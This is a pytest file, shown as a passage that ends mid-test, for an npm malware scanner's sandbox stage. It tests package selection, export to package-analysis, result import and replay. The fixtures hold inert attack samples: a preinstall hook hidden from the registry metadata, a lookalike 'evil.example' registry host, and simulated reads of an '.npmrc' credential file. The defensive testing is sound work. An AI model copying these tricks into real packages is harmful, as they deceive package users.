"""Stage 5 over runs: selection from the tarball, export for package-analysis, import of its
results, refreshing the runs that exported them, rules, replay. Offline; package-analysis is
played by `answer`, which writes hand-written result JSON (rel-38 schema, inert strings) where
the owner's package-analysis run would. Most tests use a fake rule (`ObservedRule`), so they
don't depend on the real rules (tests/rules/test_sandbox_rules.py)."""

from __future__ import annotations

import gzip
import json
from collections.abc import Sequence
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any, ClassVar

import pytest

from conftest import Router, TarEntry, make_tar_gz, run_manifest, sri_sha512
from kitsunox.collect import run_sandbox
from kitsunox.core.models import (
    ArtifactRef,
    Candidate,
    Change,
    Finding,
    PackageVersionRef,
    PublishInfo,
    Severity,
    StageDecision,
    VersionSnapshot,
)
from kitsunox.core.rules import rules_fingerprint
from kitsunox.core.run import SANDBOX_SNAPSHOT, STATIC_SNAPSHOT, DataDir
from kitsunox.ecosystems.npm.registry import packument_url
from kitsunox.rules.sandbox import RULES as REAL_RULES
from kitsunox.sandbox import bundle as bundle_module
from kitsunox.sandbox.bundle import BundleRecord, UnresolvedSpec
from kitsunox.sandbox.models import Observation, SandboxRun
from kitsunox.sandbox.ossf import RESULT_TOO_LARGE, driver_argv
from kitsunox.sandbox.results import (
    IMPORT_FILE,
    REJECTED_FILE,
    RESULT_FILE,
    SANDBOX_INFO,
    prune_sandbox,
)
from kitsunox.sandbox.select import (
    ANALYSIS_INFRA,
    BUNDLE_BUDGET,
    BUNDLE_INCOMPLETE,
    BUNDLE_PENDING,
    BUNDLE_UNREPRODUCIBLE,
    BUNDLED,
    CACHE_UNREADABLE,
    EXPORT_FAILED,
    INSTALL_FAILED,
    INTEGRITY,
    NO_MANIFEST,
    NOT_CAPTURED,
    NOT_CONFIGURED,
    NOT_IN_STORE,
    NOT_RUN,
    OVERSIZE,
    PENDING,
    RESULT_REJECTED,
    TARBALL_FETCH_FAILED,
    TARBALL_PENDING,
    TARBALL_UNREPRODUCIBLE,
    TarballInfo,
    deferred,
    inspect_tarball,
)
from kitsunox.sandbox.spool import (
    CACHE_DIR,
    JOBS_FILE,
    MAX_TARBALL_UNPACKED_BYTES,
    export_dir,
    exported_jobs,
    job_key,
)
from kitsunox.stages import sandbox as stage
from kitsunox.stages.ingest import write_jsonl
from kitsunox.stages.sandbox import (
    BUNDLE_BUDGET_BYTES,
    SANDBOX_JSONL,
    SandboxStageResult,
    active_runs,
    recorded_answers,
    run_sandbox_stage,
)
from kitsunox.stages.static import MAX_ARTIFACT_BYTES
from kitsunox.util.archive import extract_tar_gz
from kitsunox.util.hashing import sha256_hex
from kitsunox.util.http import FetchError, Snapshot, SnapshotEntry, request_key

RUN_ID = "20261029T100000Z-npm"
AS_OF = datetime(2026, 10, 29, 10, tzinfo=UTC)
STAGE4 = (
    StageDecision(stage="triage", forwarded=True, reason="rules: npm.install-hook"),
    StageDecision(stage="correlate", forwarded=True, reason="score 8"),
)
HOOKED = {"scripts": {"postinstall": "node x.js", "preinstall": "node p.js"}}


class ObservedRule:
    """Fake rule: one HIGH finding naming how many observations the analysis recorded."""

    id: ClassVar[str] = "test.observed"
    version: ClassVar[int] = 1

    def evaluate(
        self,
        candidate: Candidate,
        run: SandboxRun,
        observations: Sequence[Observation],
        *,
        shipped: frozenset[str] | None = None,
        bundled_deps: frozenset[str] | None = None,
    ) -> Sequence[Finding]:
        return (
            Finding(
                rule_id=self.id,
                rule_version=self.version,
                severity=Severity.HIGH,
                weight=5.0,
                title="observed",
                explanation=f"{len(observations)} observations, {run.status}",
            ),
        )


RULES = (ObservedRule(),)


class ShippedRule(ObservedRule):
    """Fake rule: one INFO finding naming the tarball file list the stage passed."""

    id: ClassVar[str] = "test.shipped"

    def evaluate(
        self,
        candidate: Candidate,
        run: SandboxRun,
        observations: Sequence[Observation],
        *,
        shipped: frozenset[str] | None = None,
        bundled_deps: frozenset[str] | None = None,
    ) -> Sequence[Finding]:
        listed = "none" if shipped is None else ",".join(sorted(shipped))
        return (
            Finding(
                rule_id=self.id,
                rule_version=self.version,
                severity=Severity.INFO,
                weight=0.0,
                title="shipped",
                explanation=listed,
            ),
        )


def tarball(name: str, packed: dict[str, Any] | None = None, version: str = "1.0.0") -> bytes:
    """The tarball npm installs: its own package.json, by default with two install hooks."""
    manifest = {"name": name, "version": version, **(HOOKED if packed is None else packed)}
    return make_tar_gz([TarEntry("package/package.json", json.dumps(manifest).encode())])


def url(name: str, version: str = "1.0.0") -> str:
    return f"https://registry.npmjs.org/{name}/-/{name}-{version}.tgz"


def stage4_finding(weight: float) -> Finding:
    return Finding(
        rule_id="npm.install-hook",
        rule_version=1,
        severity=Severity.HIGH,
        weight=weight,
        title="t",
        explanation="e",
    )


@dataclass(frozen=True)
class Version:
    """One version Stage 4 handled: the registry's view (`manifest`) and its tarball."""

    name: str
    version: str = "1.0.0"
    weight: float = 8.0
    manifest: dict[str, Any] | None = None  # the registry metadata (never used to select)
    body: bytes | None = None
    history: tuple[StageDecision, ...] = STAGE4
    unpacked_size: int | None = None
    integrity: str | None = None

    @property
    def bytes(self) -> bytes:
        return self.body if self.body is not None else tarball(self.name, version=self.version)

    def candidate(self) -> Candidate:
        snapshot = VersionSnapshot(
            ref=PackageVersionRef(ecosystem="npm", name=self.name, version=self.version),
            publish=PublishInfo(),
            manifest=HOOKED if self.manifest is None else self.manifest,
            artifact=ArtifactRef(
                url=url(self.name, self.version),
                integrity=self.integrity or sri_sha512(self.bytes),
                unpacked_size=self.unpacked_size,
            ),
        )
        return Candidate(
            change=Change(new=snapshot),
            findings=(stage4_finding(self.weight),),
            history=self.history,
        )

    def key(self) -> str:
        info = inspect_tarball(self.bytes)
        own = info.name if isinstance(info, TarballInfo) and info.name else self.name
        return job_key(sha256_hex(self.bytes), own)


@dataclass
class World:
    data: DataDir
    results: Path
    # Stage 5 downloads tarballs no earlier stage captured: always from this mock registry.
    registry: Router = field(default_factory=Router)

    def run_dir(self, run_id: str = RUN_ID) -> Path:
        return self.data.run_dir(run_id)

    def add_run(
        self,
        versions: Sequence[Version],
        *,
        run_id: str = RUN_ID,
        as_of: datetime = AS_OF,
        captured: Sequence[str] | None = None,
        manifest: bool = True,
    ) -> list[Candidate]:
        """A run whose Stage 4 output is `versions`; Stage 2 captured the tarballs of
        `captured` (default: all) into the blob store."""
        run_dir = self.run_dir(run_id)
        run_dir.mkdir(parents=True)
        if manifest:
            (run_dir / "manifest.json").write_text(
                run_manifest(run_id, as_of=as_of).model_dump_json()
            )
        candidates = [v.candidate() for v in versions]
        write_jsonl(run_dir / "correlate.jsonl", candidates)
        entries = {}
        for v in versions:
            if captured is not None and v.name not in captured:
                continue
            self.data.blobs.put(v.bytes)
            entries[request_key(url(v.name, v.version), None)] = SnapshotEntry(
                url=url(v.name, v.version),
                status=200,
                content_type="application/octet-stream",
                sha256=sha256_hex(v.bytes),
                size=len(v.bytes),
                fetched_at=as_of,
            )
        Snapshot(entries=entries).save(run_dir / STATIC_SNAPSHOT)
        return candidates

    def stage(
        self,
        run_id: str = RUN_ID,
        *,
        replay: bool = False,
        cap: int = 30,
        configured: bool = True,
        rules: Sequence[Any] | None = RULES,
    ) -> SandboxStageResult:
        return run_sandbox_stage(
            self.data,
            run_id,
            results=self.results if configured else None,
            rules=rules,
            cap=cap,
            replay=replay,
            client=self.registry.client(),
        )

    def jobs(self, run_id: str = RUN_ID) -> list[dict[str, Any]]:
        path = export_dir(self.data, run_id) / JOBS_FILE
        if not path.exists():
            return []
        jobs: list[dict[str, Any]] = json.loads(path.read_text())["jobs"]
        return jobs

    def output(self, run_id: str = RUN_ID) -> bytes:
        return (self.run_dir(run_id) / SANDBOX_JSONL).read_bytes()

    def info(self, run_id: str = RUN_ID) -> dict[str, Any]:
        info: dict[str, Any] = json.loads((self.run_dir(run_id) / SANDBOX_INFO).read_text())
        return info

    def answer(self, run_id: str = RUN_ID, **install: Any) -> int:
        """Play the owner running package-analysis on every job the run exported, as jobs.json
        says (RESULTS_DIR=$PWD/results/<key>, -package, -version), then copying the export's
        results/ back into the results root."""
        jobs = self.jobs(run_id)
        for job in jobs:
            assert job["results_dir"] == f"results/{job['key']}"
            args = job["args"]
            package = args[args.index("-package") + 1]
            directory = self.results / job["key"]
            directory.mkdir(parents=True, exist_ok=True)
            (directory / f"{job['version']}.json").write_bytes(
                result(package, job["version"], **install)
            )
        return len(jobs)


def result(name: str, version: str = "1.0.0", **install: Any) -> bytes:
    summary: dict[str, Any] = {
        "Status": "completed",
        "Stdout": None,
        "Stderr": None,
        "Files": [{"Path": "/root/.npmrc", "Read": True, "Write": False, "Delete": False}],
        "Sockets": None,
        "Commands": [{"Command": ["sh", "-c", "node x.js"], "Environment": ["HOME=/root"]}],
        "DNS": [{"Class": "IN", "Queries": [{"Hostname": "registry.npmjs.org", "Types": ["A"]}]}],
    }
    summary.update(install)
    raw = {
        "Package": {"Ecosystem": "npm", "Name": name.lower(), "Version": version},
        "CreatedTimestamp": 1767225600,
        "Analysis": {"install": summary},
    }
    return json.dumps(raw, separators=(",", ":")).encode()


@pytest.fixture
def world(tmp_path: Path) -> World:
    results = tmp_path / "pa-results"
    results.mkdir()
    return World(DataDir(tmp_path / "data"), results)


def by_name(candidates: Sequence[Candidate]) -> dict[str, Candidate]:
    return {c.change.new.ref.name: c for c in candidates}


def not_run_reason(c: Candidate) -> str | None:
    reasons = [f.evidence[0].snippet for f in c.findings if f.rule_id == NOT_RUN.id]
    assert len(reasons) <= 1
    return reasons[0] if reasons else None


def stage5_ids(c: Candidate) -> list[str]:
    return [f.rule_id for f in c.findings if f.rule_id != "npm.install-hook"]


def assert_only_adds(before: Sequence[Candidate], after: Sequence[Candidate]) -> None:
    """Stage 5 keeps Stage 4's candidate and appends; it never sets forwarded False."""
    stage4 = by_name(before)
    for c in after:
        original = stage4[c.change.new.ref.name]
        assert c.change == original.change
        assert c.findings[: len(original.findings)] == original.findings
        assert c.history[:-1] == original.history
        assert c.history[-1].stage == "sandbox" and c.history[-1].forwarded is True


@pytest.fixture
def untouchable(monkeypatch: pytest.MonkeyPatch) -> None:
    """Any import from, or export to, package-analysis fails the test."""

    def refuse(*args: object, **kwargs: object) -> None:
        raise AssertionError("touched the results directory or the export")

    for name in ("import_results", "export_jobs", "exported_jobs"):
        monkeypatch.setattr(stage, name, refuse)


# --- selection and not-run reasons ----------------------------------------------------------------


def test_only_reported_versions_in_stage4_order_with_hooks_from_the_tarball(
    world: World,
) -> None:
    unreported = Version(
        "a-unreported",
        history=(StageDecision(stage="correlate", forwarded=False, reason="score 0"),),
    )
    versions = [
        Version("z-hook"),
        unreported,
        Version("m-nohook", body=tarball("m-nohook", {"scripts": {"test": "jest"}})),
        Version(
            "b-gyp",
            body=make_tar_gz(
                [
                    TarEntry("package/package.json", b'{"name": "b-gyp"}'),
                    TarEntry("package/binding.gyp", b"{}"),
                ]
            ),
        ),
    ]
    candidates = world.add_run(versions)
    written = world.stage().candidates
    assert [c.change.new.ref.name for c in written] == ["z-hook", "m-nohook", "b-gyp"]
    assert_only_adds(candidates, written)
    out = by_name(written)
    assert not_run_reason(out["z-hook"]) == PENDING
    assert not_run_reason(out["m-nohook"]) is None
    assert out["m-nohook"].history[-1].reason == "no install hook"
    assert not_run_reason(out["b-gyp"]) == PENDING  # npm's implicit node-gyp install
    hooks = {j["name"]: j["hooks"] for j in world.jobs()}
    assert hooks == {"z-hook": ["preinstall", "postinstall"], "b-gyp": ["install"]}
    lines = world.output().splitlines()
    assert [Candidate.model_validate_json(line) for line in lines] == list(written)


def test_a_hook_the_registry_metadata_hides_is_still_analysed(world: World) -> None:
    """Manifest confusion (round-2 review): the packument shows no scripts, the tarball has a
    preinstall. npm runs the tarball's, so the version is selected with that hook."""
    hidden = Version(
        "hidden",
        manifest={"name": "hidden"},
        body=tarball("hidden", {"scripts": {"preinstall": "node evil.js"}}),
    )
    partial = Version(
        "partial",
        manifest={"scripts": {"postinstall": "node ok.js"}},
        body=tarball("partial", {"scripts": {"preinstall": "node a.js", "postinstall": "x"}}),
    )
    shown_only = Version(
        "shown-only",
        manifest={"scripts": {"postinstall": "node x.js"}},
        body=tarball("shown-only", {}),
    )
    world.add_run([hidden, partial, shown_only])
    out = by_name(world.stage().candidates)
    assert not_run_reason(out["hidden"]) == PENDING
    assert not_run_reason(out["shown-only"]) is None  # npm would run nothing
    hooks = {j["name"]: j["hooks"] for j in world.jobs()}
    assert hooks == {"hidden": ["preinstall"], "partial": ["preinstall", "postinstall"]}


def test_versions_whose_tarball_cannot_be_checked_say_why(world: World) -> None:
    wrong = Version("wrong-integrity", integrity=sri_sha512(b"other bytes"))
    versions = [
        Version("uncaptured"),  # and not on the registry either
        wrong,
        Version("big", unpacked_size=MAX_TARBALL_UNPACKED_BYTES + 1),
        Version("no-manifest", body=make_tar_gz([TarEntry("package/index.js", b"1")])),
    ]
    world.add_run(versions, captured=["wrong-integrity", "big", "no-manifest"])
    out = by_name(world.stage().candidates)
    assert not_run_reason(out["uncaptured"]) == TARBALL_FETCH_FAILED
    assert not_run_reason(out["wrong-integrity"]) == INTEGRITY
    assert not_run_reason(out["big"]) == OVERSIZE
    assert not_run_reason(out["no-manifest"]) == NO_MANIFEST
    assert world.jobs() == []
    assert world.info()["counts"]["not_run"] == 4


def serve(world: World, *versions: Version) -> None:
    for v in versions:
        world.registry.add_bytes(url(v.name, v.version), v.bytes)


def test_stage5_downloads_a_tarball_no_earlier_stage_captured(world: World) -> None:
    """Over Stage 2's 16 MB cap, or reported by Stage 4 after Stage 1 passed it over: Stage 5
    downloads the tarball itself (nothing is run), records it in its own snapshot, and a
    replay reads it from there."""
    big = Version("big-binary", unpacked_size=MAX_ARTIFACT_BYTES + 1)
    late = Version("late")
    world.add_run([big, late, Version("captured")], captured=["captured"])
    serve(world, big, late)
    first = by_name(world.stage().candidates)
    assert {n: not_run_reason(c) for n, c in first.items()} == dict.fromkeys(first, PENDING)
    assert sorted(j["name"] for j in world.jobs()) == ["big-binary", "captured", "late"]
    assert sorted(world.registry.requests) == [url("big-binary"), url("late")]
    recorded = Snapshot.load(world.run_dir() / SANDBOX_SNAPSHOT).entries
    assert {request_key(url("late"), None), request_key(url("big-binary"), None)} <= set(recorded)
    assert world.info()["tarballs"] == {}
    assert not (world.data.root / CACHE_DIR / stage.STAGING_DIR / RUN_ID).exists()
    output = world.output()
    world.registry.offline.update([url("big-binary"), url("late")])
    world.stage(replay=True)
    assert world.output() == output
    assert len(world.registry.requests) == 2  # replay never fetches


def test_a_download_over_the_budget_or_offline_waits_for_the_next_call(world: World) -> None:
    high, low = Version("high", weight=9.0), Version("low", weight=1.0)
    world.add_run([high, low], captured=[])
    serve(world, high, low)
    world.registry.offline.add(url("high"))

    def call(budget: int) -> dict[str, Candidate]:
        return by_name(
            run_sandbox_stage(
                world.data,
                RUN_ID,
                results=world.results,
                rules=RULES,
                bundle_budget=budget,
                client=world.registry.client(),
            ).candidates
        )

    out = call(BUNDLE_BUDGET_BYTES)
    # high failed first (score order), so low isn't tried in the same call (decision 0009)
    assert not_run_reason(out["high"]) == not_run_reason(out["low"]) == TARBALL_PENDING
    assert world.registry.requests.count(url("low")) == 0
    assert world.info()["counts"]["pending"] == 2
    assert world.info()["tarballs"] == dict.fromkeys(
        ["npm:high@1.0.0", "npm:low@1.0.0"], TARBALL_PENDING
    )
    assert stage.stale(world.data, RUN_ID)
    replayed = world.output()
    world.stage(replay=True)
    assert world.output() == replayed  # the replay says what the live call recorded

    world.registry.offline.clear()
    out = call(0)  # over the budget before any download
    assert not_run_reason(out["high"]) == TARBALL_PENDING
    out = call(BUNDLE_BUDGET_BYTES)
    assert not_run_reason(out["high"]) == not_run_reason(out["low"]) == PENDING
    assert world.info()["tarballs"] == {}
    assert not stage.stale(world.data, RUN_ID)


def test_a_failed_download_is_recorded_and_not_tried_again(world: World) -> None:
    world.add_run([Version("gone-from-npm")], captured=[])
    (out,) = world.stage().candidates
    assert not_run_reason(out) == TARBALL_FETCH_FAILED
    assert world.info()["tarballs"] == {"npm:gone-from-npm@1.0.0": TARBALL_FETCH_FAILED}
    assert not stage.stale(world.data, RUN_ID)
    (again,) = world.stage(replay=True).candidates
    assert not_run_reason(again) == TARBALL_FETCH_FAILED


def test_a_refused_download_is_not_tried_again(
    world: World, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A definite failure that leaves nothing in the snapshot (a size limit, a refused
    redirect): recorded, so later calls don't download it again and a replay agrees."""
    world.add_run([Version("refused")], captured=[])
    tried: list[str] = []

    def refuse(self: object, url: str, **kwargs: object) -> object:
        tried.append(url)
        raise FetchError("redirect refused")

    monkeypatch.setattr(stage._BundleFetcher, "get", refuse)
    (out,) = world.stage().candidates
    assert not_run_reason(out) == TARBALL_FETCH_FAILED
    (again,) = world.stage().candidates
    assert not_run_reason(again) == TARBALL_FETCH_FAILED
    assert tried == [url("refused")]
    (replayed,) = world.stage(replay=True).candidates
    assert not_run_reason(replayed) == TARBALL_FETCH_FAILED


def test_without_a_results_root_nothing_is_downloaded(world: World) -> None:
    world.add_run([Version("late")], captured=[])
    serve(world, Version("late"))
    (out,) = world.stage(configured=False).candidates
    assert not_run_reason(out) == NOT_CAPTURED
    assert world.registry.requests == []


def test_a_non_registry_tarball_url_is_never_downloaded(world: World) -> None:
    v = Version("elsewhere")
    world.add_run([v], captured=[])
    lines = (
        (world.run_dir() / "correlate.jsonl")
        .read_text()
        .replace("https://registry.npmjs.org/", "https://registry.npmjs.org.evil.example/")
    )
    (world.run_dir() / "correlate.jsonl").write_text(lines)
    (out,) = world.stage().candidates
    assert not_run_reason(out) == NOT_CAPTURED
    assert world.registry.requests == []


def test_a_replay_without_the_recorded_download_says_so(world: World) -> None:
    world.add_run([Version("late")], captured=[])
    serve(world, Version("late"))
    world.stage()
    (world.run_dir() / SANDBOX_SNAPSHOT).unlink()
    (out,) = world.stage(replay=True).candidates
    assert not_run_reason(out) == TARBALL_UNREPRODUCIBLE


def test_a_tarball_missing_from_the_blob_store(world: World) -> None:
    world.add_run([Version("gone")])
    sha = sha256_hex(Version("gone").bytes)
    (world.data.blobs.root / sha[:2] / f"{sha}.zst").unlink()
    (out,) = world.stage().candidates
    assert not_run_reason(out) == NOT_IN_STORE


def test_cap_defers_the_lowest_scores(world: World) -> None:
    world.add_run([Version("low", weight=1.0), Version("high", weight=9.0)])
    out = by_name(world.stage(cap=1).candidates)
    assert not_run_reason(out["high"]) == PENDING
    assert not_run_reason(out["low"]) == deferred(1)
    assert [j["name"] for j in world.jobs()] == ["high"]
    assert world.info()["counts"]["deferred"] == 1


# --- the gate and the export ----------------------------------------------------------------------


def test_without_a_results_directory_nothing_is_exported(world: World) -> None:
    world.add_run([Version("kx")])
    (out,) = world.stage(configured=False).candidates
    assert not_run_reason(out) == NOT_CONFIGURED
    assert not (world.data.root / CACHE_DIR).exists()
    assert recorded_answers(world.run_dir()) == {Version("kx").key(): stage.Answer("unconfigured")}


def test_export_lists_what_package_analysis_needs(world: World) -> None:
    world.add_run([Version("kx")])
    world.stage()
    (job,) = world.jobs()
    key = Version("kx").key()
    local = export_dir(world.data, RUN_ID) / f"{key}.tgz"
    assert local.read_bytes() == Version("kx").bytes
    assert (job["name"], job["version"], job["key"], job["file"]) == (
        "kx",
        "1.0.0",
        key,
        f"{key}.tgz",
    )
    assert job["results_dir"] == f"results/{key}"
    assert job["network"] == "airgapped" and job["bundle"] is None
    assert job["args"][:2] == ["-fully-offline", "-nointeractive"]
    assert job["args"][-2:] == ["-nopull", "-offline"]
    info = world.info()
    assert info["network"] == "airgapped"
    assert info["keys"] == {"npm:kx@1.0.0": key}
    assert info["answers"] == {key: {"state": "pending", "result_sha256": None, "reason": None}}
    assert info["counts"]["pending"] == 1


def test_a_failed_export_is_recorded_and_replayed(
    world: World, monkeypatch: pytest.MonkeyPatch
) -> None:
    world.add_run([Version("kx")])
    monkeypatch.setattr(stage, "export_jobs", lambda *a, **k: frozenset())
    live = world.stage().candidates
    assert not_run_reason(live[0]) == EXPORT_FAILED
    assert world.info()["answers"][Version("kx").key()]["state"] == "export-failed"
    output = world.output()
    monkeypatch.undo()
    assert world.stage(replay=True).candidates == live
    assert world.output() == output


def test_a_tarball_that_vanishes_before_export_is_an_export_failure(
    world: World, monkeypatch: pytest.MonkeyPatch
) -> None:
    world.add_run([Version("kx")])
    monkeypatch.setattr(stage, "_tarball", lambda *args: None)
    (out,) = world.stage().candidates
    assert not_run_reason(out) == EXPORT_FAILED


# --- importing and analysing ----------------------------------------------------------------------


def test_a_result_is_imported_analysed_and_replayed(world: World) -> None:
    candidates = world.add_run([Version("kx")])
    world.stage()
    assert world.answer() == 1
    staged = world.stage()
    (out,) = staged.candidates
    key = Version("kx").key()
    assert staged.imported == {key: "accepted"}
    assert stage5_ids(out) == ["test.observed"]
    assert out.findings[-1].explanation == "3 observations, completed"
    assert out.history[-1].reason == "analysed (completed); score 5"
    assert_only_adds(candidates, staged.candidates)
    cached = world.data.root / CACHE_DIR / key
    assert (cached / RESULT_FILE).read_bytes() == result("kx")
    info = world.info()
    assert info["answers"][key] == {
        "state": "accepted",
        "result_sha256": sha256_hex(result("kx")),
        "reason": None,
    }
    assert info["counts"]["analysed"] == 1
    output = world.output()
    assert world.stage(replay=True).candidates == staged.candidates
    assert world.output() == output


def test_an_infra_error_result_is_analysed_and_says_so(world: World) -> None:
    world.add_run([Version("kx")])
    world.stage()
    world.answer(Status="error_other")
    (out,) = world.stage().candidates
    assert stage5_ids(out) == ["test.observed", NOT_RUN.id]
    assert not_run_reason(out) == ANALYSIS_INFRA
    assert world.info()["counts"]["infra_error"] == 1


def test_a_rejected_result_is_scored_and_retried_when_replaced(world: World) -> None:
    world.add_run([Version("kx")])
    world.stage()
    (job,) = world.jobs()
    path = world.results / job["key"] / "1.0.0.json"
    path.parent.mkdir(parents=True)
    path.write_bytes(result("someone-else"))
    (out,) = world.stage().candidates
    assert stage5_ids(out) == [RESULT_REJECTED.id]
    assert out.findings[-1].severity is Severity.MEDIUM
    assert "another package or version" in out.findings[-1].explanation
    answer = world.info()["answers"][Version("kx").key()]
    assert answer["state"] == "rejected"
    output = world.output()
    assert world.stage(replay=True).candidates == (out,)
    assert world.output() == output
    path.write_bytes(result("kx"))
    (fixed,) = world.stage().candidates
    assert stage5_ids(fixed) == ["test.observed"]


def test_a_hostile_result_never_breaks_the_stage(world: World, tmp_path: Path) -> None:
    world.add_run([Version("kx")])
    world.stage()
    (job,) = world.jobs()
    directory = world.results / job["key"]
    directory.mkdir(parents=True)
    target = tmp_path / "planted.json"
    target.write_bytes(result("kx"))
    (directory / "1.0.0.json").symlink_to(target)
    (out,) = world.stage().candidates
    assert stage5_ids(out) == [RESULT_REJECTED.id]


def test_versions_sharing_a_tarball_share_one_analysis(world: World) -> None:
    body = tarball("twin")
    world.add_run([Version("twin", body=body), Version("twin", version="1.0.1", body=body)])
    world.stage()
    assert len(world.jobs()) == 1
    world.answer()
    out = world.stage().candidates
    assert [stage5_ids(c) for c in out] == [["test.observed"], ["test.observed"]]


def test_a_cached_result_is_used_without_a_results_directory(world: World) -> None:
    world.add_run([Version("kx")])
    world.stage()
    world.answer()
    world.stage()
    (out,) = world.stage(configured=False).candidates
    assert stage5_ids(out) == ["test.observed"]


def test_an_unreadable_cache_is_a_not_run(world: World) -> None:
    world.add_run([Version("kx")])
    world.stage()
    world.answer()
    world.stage()
    cached = world.data.root / CACHE_DIR / Version("kx").key()
    (cached / RESULT_FILE).write_bytes(b"tampered")
    (out,) = world.stage().candidates
    assert not_run_reason(out) == (f"{CACHE_UNREADABLE} (cache: the cached result has changed)")
    assert world.info()["answers"][Version("kx").key()]["state"] == "cache-unreadable"
    output = world.output()
    world.stage(replay=True)
    assert world.output() == output


def test_a_cached_rejection_that_is_unreadable(world: World) -> None:
    world.add_run([Version("kx")])
    cached = world.data.root / CACHE_DIR / Version("kx").key()
    cached.mkdir(parents=True)
    (cached / REJECTED_FILE).write_text("not json")
    (out,) = world.stage().candidates
    assert not_run_reason(out) == (
        f"{CACHE_UNREADABLE} (cache: the cached rejection is unreadable)"
    )


# --- results reach the run that exported them -----------------------------------------------------


EARLIER = "20261029T090000Z-npm"


def test_a_result_refreshes_the_run_that_exported_it(world: World) -> None:
    """Round-2 review: tick N exports run A's job; the result arrives; tick N+1 processes run B.
    Run A's own output must show the analysis, not stay pending for ever."""
    world.add_run([Version("kx")], run_id=EARLIER, as_of=AS_OF - timedelta(hours=1))
    world.stage(EARLIER)
    assert not_run_reason(world.stage(EARLIER, replay=True).candidates[0]) == PENDING
    world.answer(EARLIER)
    world.add_run([Version("other", body=tarball("other", {}))])
    staged = world.stage()
    assert staged.refreshed == (EARLIER,)
    assert staged.imported == {Version("kx").key(): "accepted"}
    earlier = [Candidate.model_validate_json(line) for line in world.output(EARLIER).splitlines()]
    assert stage5_ids(earlier[0]) == ["test.observed"]
    output = world.output(EARLIER)
    assert world.stage(EARLIER, replay=True).candidates == tuple(earlier)
    assert world.output(EARLIER) == output
    assert world.stage().refreshed == ()  # nothing changed since


def test_a_run_shares_a_result_another_run_imported(world: World) -> None:
    world.add_run([Version("kx")], run_id=EARLIER, as_of=AS_OF - timedelta(hours=1))
    world.stage(EARLIER, configured=False)  # nothing exported for this run
    world.add_run([Version("kx")])
    world.stage()
    world.answer()
    third = "20261029T110000Z-npm"
    world.add_run([], run_id=third, as_of=AS_OF + timedelta(hours=1))
    staged = world.stage(third)
    assert set(staged.refreshed) == {EARLIER, RUN_ID}
    for run_id in (EARLIER, RUN_ID):
        (out,) = [Candidate.model_validate_json(x) for x in world.output(run_id).splitlines()]
        assert stage5_ids(out) == ["test.observed"]


def test_late_results_still_reach_the_run_that_exported_them(world: World) -> None:
    """Round-3 review: a result more than 48 hours after its export was never imported. Any
    unpruned run's export is imported into now."""
    old = "20261025T000000Z-npm"
    world.add_run([Version("kx")], run_id=old, as_of=AS_OF - timedelta(days=4, hours=10))
    world.stage(old)
    world.answer(old)
    world.add_run([])
    staged = world.stage()
    assert staged.imported == {Version("kx").key(): "accepted"}
    assert staged.refreshed == (old,)
    (out,) = [Candidate.model_validate_json(x) for x in world.output(old).splitlines()]
    assert stage5_ids(out) == ["test.observed"]


def test_pruned_and_later_runs_are_left_alone(world: World) -> None:
    pruned = "20261029T080000Z-npm"
    later = "20261029T120000Z-npm"
    world.add_run([Version("ky")], run_id=pruned, as_of=AS_OF - timedelta(hours=2))
    world.add_run([Version("kz")], run_id=later, as_of=AS_OF + timedelta(hours=2))
    world.stage(pruned)
    world.stage(later)
    world.answer(pruned)
    world.answer(later)
    (world.run_dir(pruned) / "retention.json").write_text("{}")
    world.add_run([])
    staged = world.stage()
    assert staged.refreshed == ()
    assert staged.imported == {}  # a pruned run's export is gone; a later run is its own
    assert active_runs(world.data, RUN_ID) == (RUN_ID,)


def test_active_runs_are_by_manifest_as_of_newest_first_and_bounded(
    world: World, monkeypatch: pytest.MonkeyPatch
) -> None:
    later = "20261029T120000Z-npm"
    oldest = "20261020T000000Z-npm"
    world.add_run([], run_id=EARLIER, as_of=AS_OF - timedelta(hours=1))
    world.add_run([], run_id=oldest, as_of=AS_OF - timedelta(days=9))
    world.add_run([], run_id=later, as_of=AS_OF + timedelta(hours=2))
    world.add_run([])
    assert active_runs(world.data, RUN_ID) == (RUN_ID, EARLIER, oldest)
    assert active_runs(world.data, later) == (later, RUN_ID, EARLIER, oldest)
    assert active_runs(world.data, "absent") == ("absent",)
    monkeypatch.setattr(stage, "MAX_ACTIVE_RUNS", 2)
    assert active_runs(world.data, RUN_ID) == (RUN_ID, EARLIER)
    (world.run_dir(EARLIER) / "manifest.json").write_text("not json")
    assert active_runs(world.data, RUN_ID) == (RUN_ID, oldest)


def test_the_current_run_is_always_active(world: World, monkeypatch: pytest.MonkeyPatch) -> None:
    same = "20261029T100000Z-npm-b"
    world.add_run([])
    world.add_run([], run_id=same)
    monkeypatch.setattr(stage, "MAX_ACTIVE_RUNS", 1)
    assert active_runs(world.data, RUN_ID) == (RUN_ID,)


def test_runs_whose_jobs_wait_too_long_are_told(world: World) -> None:
    old = "20261026T000000Z-npm"
    world.add_run([Version("kx"), Version("ky")], run_id=old, as_of=AS_OF - timedelta(days=3))
    world.add_run([Version("kz")], run_id=EARLIER, as_of=AS_OF - timedelta(hours=1))
    world.stage(old)
    world.stage(EARLIER)
    world.add_run([])
    assert world.stage().overdue == {old: 2}  # EARLIER's job isn't late yet
    (job, _) = world.jobs(old)
    directory = world.results / job["key"]
    directory.mkdir()
    (directory / "1.0.0.json").write_bytes(b"{}")  # answered (rejected) counts as answered
    assert world.stage().overdue == {old: 1}
    staged = run_sandbox_stage(
        world.data,
        RUN_ID,
        results=world.results,
        rules=RULES,
        overdue_after=timedelta(0),
        client=world.registry.client(),
    )
    assert staged.overdue == {old: 1, EARLIER: 1}
    assert world.stage(replay=True).overdue == {}
    assert world.stage(configured=False).overdue == {}


def test_a_refresh_uses_the_cap_the_run_was_rendered_with(world: World) -> None:
    versions = [Version("high", weight=9.0), Version("low", weight=1.0)]
    world.add_run(versions, run_id=EARLIER, as_of=AS_OF - timedelta(hours=1))
    world.stage(EARLIER, cap=1)
    world.answer(EARLIER)
    world.add_run([])
    world.stage(cap=30)
    out = {
        c.change.new.ref.name: c
        for c in (Candidate.model_validate_json(x) for x in world.output(EARLIER).splitlines())
    }
    assert stage5_ids(out["high"]) == ["test.observed"]
    assert not_run_reason(out["low"]) == deferred(1)


def test_an_unreadable_earlier_run_is_skipped(world: World) -> None:
    world.add_run([Version("kx")], run_id=EARLIER, as_of=AS_OF - timedelta(hours=1))
    world.stage(EARLIER)
    world.answer(EARLIER)
